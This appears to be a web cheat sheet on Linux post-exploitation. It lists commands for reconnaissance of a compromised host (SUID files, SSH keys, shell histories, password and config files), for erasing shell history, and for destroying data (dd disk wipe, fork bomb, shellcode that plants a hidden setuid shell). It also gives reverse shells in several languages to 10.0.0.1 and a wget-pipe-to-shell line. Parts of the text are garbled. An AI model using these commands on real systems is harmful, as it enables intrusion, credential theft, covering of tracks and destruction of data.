https://n0where.net/linux-post-exploitation

Linux Post Exploitation

Collecting Information – Command Reference

System

lshw
cat /proc/cpuinfo
cat /proc/meminfo
du -h --max-depth=1

which nmap
locate bin/nmap
locate bin/nc

    ls -dlR */
    ls -alR | grep ^d
    find /var -type d
    ls -dl `find /var -type d`
    ls -dl `find /var -type d` | grep -v root
    find /var ! -user root -type d -ls
    find /var/log -type f -exec ls -la {} \;
    find / -perm -4000 (find all suid files)
    ls -alhtr /mnt
    ls -alhtr /media
    ls -alhtr /tmp
    ls -alhtr /home
    cd /home/; treels /home//.ssh/
    find /home -type f -iname ‘.*history’
    ls -lart /etc/rc.d/
    locate tar | grep [.]tar$
    locate tgz | grep [.]tgz$
    locate sql | grep [.]sql$
    locate settings | grep [.]php$
    locate config.inc | grep [.]php$
    ls /home//id
    .properties | grep [.]properties # java config files
    locate .xml | grep [.]xml # java/.net config files
    find /sbin /usr/sbin /opt /lib `echo $PATH | ‘sed s/:/ /g’` -perm /6000 -ls # find suids
    locate rhosts

/tmp/krb5cc_*
/tmp/krb5.keytab

/home/*/.gnupg/secring.gpgs
Networking

cat /etc/network/interfaces

iptables -L -n -v
iptables -t nat -L -n -v
ip6tables -L -n -v
iptables-save

netstat -anop
netstat -r
netstat -nltupw root with raw sockets

    ls -aRl /etc/ * awk ‘$1 ~ /w.$/’ * grep -v lrwx 2>/dev/nullte
    cat /etc/issue{,.net}
    cat /etc/master.passwd
    cat /etc/group
    cat /etc/hosts
    cat /etc/crontab
    cat /etc/sysctl.conf
    for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)
    cat /etc/resolv.conf
    cat /etc/syslog.conf
    cat /etc/chttp.conf
    cat /etc/lighttpd.conf
    cat /etc/cups/cupsd.confcda
    cat /etc/inetd.conf
    cat /opt/lampp/etc/httpd.conf
    cat /etc/samba/smb.conf
    cat /etc/openldap/ldap.conf
    cat /etc/ldap/ldap.conf
    cat /etc/exports
    cat /etc/auto.master
    cat /etc/auto_master
    cat /etc/fstab
    find /etc/sysconfig/ -type f -exec cat {} \;

User Accounts

pdbedit -L -w
pdbedit -L -v

cat /etc/aliases
find /etc -name aliases
getent aliases


    ls -alh /home/*/
    ls -alh /home/*/.ssh/
    cat /home/*/.ssh/authorized_keys
    cat /home/*/.ssh/known_hosts
    cat /home//.hist* # you can learn a lot from this
    find /home//.vnc /home//.subversion -type f
    grep ^ssh /home//.hist*
    grep ^telnet `/home//.hist*
    grep ^mysql /home//.hist*
    cat /home/*/.viminfo
    sudo -l
    crontab -l
    cat /home/*/.mysql_history
    sudo -p

Distro

/etc/issue
cat /etc/*release

/etc/redhat-release,
/etc/redhat_version

/etc/slackware-release,
/etc/slackware-version

/etc/debian_release,
/etc/debian_version
Installed Packages

    rpm -qa –last | head
    yum list | grep installed
    Debian
    dpkg -l
    dpkg -l | grep -i “linux-image”
    dpkg –get-selections
    {Free,Net}BSD: pkg_info
    Solaris: pkginfo
    Gentoo: cd /var/db/pkg/ && ls -d / # always works
    Arch Linux: pacman -Q

Package Sources

    cat /etc/apt/sources.list
    ls -l /etc/yum.repos.d/
    cat /etc/yum.conf

Avoiding history

    export HISTFILE=
    or
    unset HISTFILE
    history -c
    rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)
    touch ~/.bash_history (invasive)
    history -c (using a space before a command)
    zsh% unset HISTFILE HISTSIZE
    tcsh% set history=0
    bash$ set +o history
    ksh$ unset HISTFILE
    find / -type f -exec {} (forensics nightmare)


Delete && Destruction

dd if=/dev/zero of=/dev/sda bs=1M

    Hex version of rm -rf /

char esp[] __attribute__ ((section(”.text”))) /* e.s.p release */ =
 “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68\"
 “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99\"
 “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7\"
 “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
 “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
 “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00"
 “cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;

    Fork Bomb: The [in]famous “fork bomb”. This command will cause your system to run a large number of processes, until it “hangs”. This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.

:(){:|:&};:

Reverse Shell

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'

    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

    ssh -NR 3333:localhost:22 user@yourhost

    nc -e /bin/sh 10.0.0.1 1234

Execute a Remote Script

wget http://server/file.sh -O- | sh

This command forces the download of a file and immediately its execution

Linux Post Exploitation Linux Post Exploitation Linux Post Exploitation Linux Post Exploitation Linux Post Exploitation Linux Post Exploitation Linux Post Exploitation Linux Post Exploitation


Read More

Cross-Platform Post-Exploitation HTTP/2 Command & Control Server: Merlin


Read More

WebSocket C2 Communication Channel: WSC2


Read More

Free, Open-Source Remote Administration Tool for Windows: QuasarRAT
